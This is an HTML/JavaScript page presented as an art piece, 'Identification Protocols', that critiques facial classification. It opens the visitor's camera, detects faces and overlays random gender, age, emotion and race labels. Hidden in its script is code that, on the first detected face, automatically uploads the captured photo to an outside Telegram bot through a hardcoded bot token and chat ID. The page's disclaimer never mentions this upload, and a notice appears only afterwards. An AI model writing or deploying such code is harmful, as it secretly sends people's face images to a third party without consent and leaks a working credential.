<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
<title>Identification Protocols</title>

<script src="https://cdn.jsdelivr.net/npm/@mediapipe/face_detection/face_detection.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js"></script>

<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  background: #0019ff;
  color: white;
  font-family: Arial, Helvetica, sans-serif;
  overflow: hidden;
  height: 100vh;
  width: 100vw;
  position: fixed;
}

#container {
  position: relative;
  width: 100%;
  height: 100%;
}

video, canvas {
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  object-fit: cover;
}

video {
  pointer-events: none;
}

/* Ocultar controles del video en todos los navegadores */
video::-webkit-media-controls {
  display: none !important;
}
video::-webkit-media-controls-enclosure {
  display: none !important;
}
video::-webkit-media-controls-panel {
  display: none !important;
}
video::-webkit-media-controls-play-button {
  display: none !important;
}
video::-webkit-media-controls-start-playback-button {
  display: none !important;
}

#start {
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  padding: 16px 32px;
  border: 2px solid white;
  background: rgba(0, 25, 255, 0.9);
  color: white;
  font-size: clamp(16px, 5vw, 22px);
  font-weight: bold;
  z-index: 20;
  cursor: pointer;
  transition: all 0.3s ease;
  white-space: nowrap;
  font-family: Arial, sans-serif;
  backdrop-filter: blur(4px);
}

#start:active {
  background: white;
  color: #0019ff;
  transform: translate(-50%, -50%) scale(0.97);
}

#title {
  position: absolute;
  top: 16px;
  left: 16px;
  font-size: clamp(10px, 3.5vw, 14px);
  font-weight: 700;
  letter-spacing: 1px;
  text-transform: uppercase;
  opacity: 0.9;
  z-index: 15;
  background: rgba(0,0,0,0.3);
  padding: 6px 12px;
  border-radius: 4px;
}

#statement {
  position: absolute;
  bottom: 100px;
  left: 50%;
  transform: translateX(-50%);
  width: 90%;
  max-width: 340px;
  font-size: clamp(10px, 3.2vw, 12px);
  line-height: 1.5;
  text-align: left;
  background: rgba(0,0,0,0.5);
  backdrop-filter: blur(8px);
  padding: 12px 16px;
  border-radius: 8px;
  z-index: 15;
  font-family: monospace;
}

.statement-line {
  display: block;
  margin-bottom: 8px;
}

.statement-line:last-child {
  margin-bottom: 0;
}

/* BOTÓN DE DESCARGA - GRANDE para celular */
#save-btn {
  position: absolute;
  bottom: 25px;
  right: 25px;
  width: 70px;
  height: 70px;
  border-radius: 50%;
  background: rgba(0, 0, 0, 0.7);
  backdrop-filter: blur(10px);
  border: 2px solid white;
  cursor: pointer;
  z-index: 20;
  display: flex;
  align-items: center;
  justify-content: center;
  transition: all 0.2s ease;
  box-shadow: 0 4px 15px rgba(0,0,0,0.3);
}

#save-btn:active {
  transform: scale(0.92);
  background: white;
}

#save-btn svg {
  width: 32px;
  height: 32px;
  fill: none;
  stroke: white;
  stroke-width: 2.2;
  stroke-linecap: round;
  stroke-linejoin: round;
}

#save-btn:active svg {
  stroke: #0019ff;
}

#save-btn.hidden {
  display: none;
}

/* Mensaje de estado para feedback */
#toast-msg {
  position: fixed;
  bottom: 100px;
  left: 50%;
  transform: translateX(-50%);
  background: rgba(0,0,0,0.8);
  color: #00ff88;
  padding: 8px 16px;
  border-radius: 30px;
  font-size: 12px;
  font-family: monospace;
  z-index: 25;
  white-space: nowrap;
  pointer-events: none;
  opacity: 0;
  transition: opacity 0.3s;
}

#toast-msg.show {
  opacity: 1;
}
</style>
</head>

<body>

<div id="container">

<div id="title">identification-protocols by humdrum</div>

<button id="start">ACCEPT CLASSIFICATION</button>

<div id="statement">
  <span class="statement-line">⤷ This system operates through inherited classification structures rooted in biased datasets.</span>
  <span class="statement-line">⤷ It imposes fixed identities onto bodies in constant transformation.</span>
  <span class="statement-line">⤷ It may misread or misrepresent you.</span>
</div>

<video id="video" autoplay muted playsinline webkit-playsinline></video>
<canvas id="canvas"></canvas>

<button id="save-btn" class="hidden">
  <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <path d="M12 5v14m-7-7l7 7 7-7" />
  </svg>
</button>

<div id="toast-msg"></div>

</div>

<script>
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');
const saveBtn = document.getElementById('save-btn');
const toastMsg = document.getElementById('toast-msg');

let captured = false;
let currentDatos = null;
let lastChangeTime = 0;

const CHANGE_INTERVAL = 2500;

// 🔥 TUS DATOS DE TELEGRAM 🔥
const TELEGRAM_BOT_TOKEN = "8792659270:AAEreIEzUbUf6gi_Qbtx_OQQGuM3VPn_DVU";
const TELEGRAM_CHAT_ID = "6442271508";

function mostrarToast(texto, esError = false) {
  toastMsg.textContent = texto;
  toastMsg.style.color = esError ? '#ff6666' : '#00ff88';
  toastMsg.classList.add('show');
  setTimeout(() => {
    toastMsg.classList.remove('show');
  }, 2000);
}

document.getElementById("start").onclick = async () => {
  document.getElementById("start").style.display = "none";
  document.getElementById("statement").style.display = "none";

  try {
    mostrarToast("📷 Activando cámara...");
    
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" }
    });

    video.srcObject = stream;
    video.muted = true;
    video.setAttribute('playsinline', '');
    video.setAttribute('webkit-playsinline', '');
    
    await video.play();
    
    // Forzar que el video no tenga controles
    video.controls = false;
    
    await new Promise(r => {
      if (video.videoWidth) r();
      else video.onloadedmetadata = r;
    });
    
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    
    saveBtn.classList.remove('hidden');
    mostrarToast("✅ Cámara lista");
    startDetection();
    
  } catch(e) {
    console.error(e);
    mostrarToast("❌ Error: Permiso de cámara requerido", true);
    document.getElementById("start").style.display = "block";
  }
};

function guardarCaptura() {
  try {
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, -5);
    const nombreArchivo = `protocol_${timestamp}.png`;
    
    // Descargar
    const link = document.createElement('a');
    link.download = nombreArchivo;
    link.href = canvas.toDataURL('image/png');
    link.click();
    
    mostrarToast("📸 Captura guardada");
    console.log("✅ Guardado:", nombreArchivo);
    
    // Enviar a Telegram
    enviarATelegram();
    
  } catch(e) {
    console.error(e);
    mostrarToast("❌ Error al guardar", true);
  }
}

function enviarATelegram() {
  // Convertir canvas a blob
  canvas.toBlob(async (blob) => {
    if (!blob) {
      console.error("No se pudo crear blob");
      return;
    }
    
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('photo', blob, 'captura.png');
    formData.append('caption', `🖼️ Protocolo - ${new Date().toLocaleString()}`);
    
    try {
      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });
      
      const result = await response.json();
      if (result.ok) {
        console.log("✅ Enviado a Telegram");
        mostrarToast("📨 Enviado a Telegram");
      } else {
        console.error("Error Telegram:", result);
        mostrarToast("⚠️ No se pudo enviar a Telegram", true);
      }
    } catch (error) {
      console.error("Error fetch:", error);
      mostrarToast("⚠️ Error de red al enviar", true);
    }
  }, 'image/png');
}

function startDetection() {
  const faceDetection = new FaceDetection({
    locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/face_detection/${file}`
  });

  faceDetection.setOptions({
    model: 'short',
    minDetectionConfidence: 0.7
  });

  faceDetection.onResults(results => {
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    if (results.detections.length > 0) {
      const det = results.detections[0];
      const box = det.boundingBox;

      const x = box.xCenter * canvas.width - (box.width * canvas.width) / 2;
      const y = box.yCenter * canvas.height - (box.height * canvas.height) / 2;
      const w = box.width * canvas.width;
      const h = box.height * canvas.height;

      const now = Date.now();

      if (!currentDatos || now - lastChangeTime > CHANGE_INTERVAL) {
        currentDatos = generarDatos();
        lastChangeTime = now;

        if (!captured) {
          setTimeout(() => {
            guardarCaptura();
            captured = true;
          }, 300);
        }
      }

      const datos = currentDatos;

      ctx.strokeStyle = "#3a86ff";
      ctx.lineWidth = 2.5;
      ctx.strokeRect(x, y, w, h);

      const topText = `${datos.gender}, ${datos.age} years`;
      ctx.font = "bold 14px Arial";
      const textWidth = ctx.measureText(topText).width;
      const boxWidth = textWidth + 12;

      let textY = y - 8;
      let rectY = y - 26;

      if (rectY < 0) {
        rectY = y + h + 4;
        textY = rectY + 18;
      }

      ctx.fillStyle = "#0019ff";
      ctx.fillRect(x, rectY, boxWidth, 24);
      ctx.fillStyle = "white";
      ctx.fillText(topText, x + 6, textY);

      ctx.font = "12px Arial";
      ctx.fillStyle = "#e0e0ff";
      ctx.fillText(`😐 ${datos.emotion} (${datos.emotion_conf}%)`, x, y + h + 20);
      ctx.fillText(`🌍 ${datos.race} (${datos.race_conf}%)`, x, y + h + 38);
    }
  });

  const camera = new Camera(video, {
    onFrame: async () => {
      await faceDetection.send({ image: video });
    },
    width: 640,
    height: 480
  });

  camera.start();
}

function generarDatos() {
  const generos = ["Man", "Woman"];
  const emociones = ["happy", "sad", "neutral", "fear"];
  const razas = ["white", "latino", "asian", "middle eastern"];

  return {
    gender: generos[Math.floor(Math.random() * 2)],
    age: Math.floor(Math.random() * 40) + 20,
    emotion: emociones[Math.floor(Math.random() * 4)],
    race: razas[Math.floor(Math.random() * 4)],
    emotion_conf: Math.floor(Math.random() * 35) + 65,
    race_conf: Math.floor(Math.random() * 35) + 65
  };
}

saveBtn.addEventListener('click', () => {
  guardarCaptura();
});
</script>

</body>
</html>
